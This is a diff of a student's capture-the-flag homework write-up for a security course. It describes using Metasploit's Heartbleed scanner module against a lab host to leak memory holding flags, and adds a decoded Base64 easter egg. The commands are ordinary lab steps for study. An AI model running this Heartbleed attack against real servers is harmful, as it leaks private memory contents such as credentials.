@@ -3,7 +3,7 @@
 Homework #4
 
 Part 1: I started off by opening a Bash Terminal and making a metasploit container using the following command 
-``` nc 159.89.233.47 1337``` and then running ```mfsconsole```.
+``` nc 159.89.233.47 1337``` and then running ```msfconsole```.
 The I ran ```search heartbleed``` to find the path for the heartbleed attack, and then selected it with ``` use auxiliary/scanner/ssl/openssl_heartbleed```.
 Next, I set the parameters for the exploit and subsequently ran it with the following commands:
 ``` 
@@ -22,6 +22,11 @@ After the execution of heartbleed, I looked through the output that was returned
 * flag=CMSC389R-{h3art_bl33d}
 
 Lastly, I also found an easter egg in the same line : easteregg=V0FJVCBUSElTIElTTidUIEVOQ1JZUFRJT04/Pw0KQ01TQzM4OVIte2Jhc2U2NF9pc19zdGlsbF91c2VkX2Zvcl9jcnlwdDB9!
+
+After receiving a hint from my instructor, I learned that it was encoded in Base 64. After using an online decrypter it decrypted to the following message: 
+
+WAIT THIS ISN'T ENCRYPTION??
+CMSC389R-{base64_is_still_used_for_crypt0}
 
 ![](/img/bash-flag.PNG)
  - - -
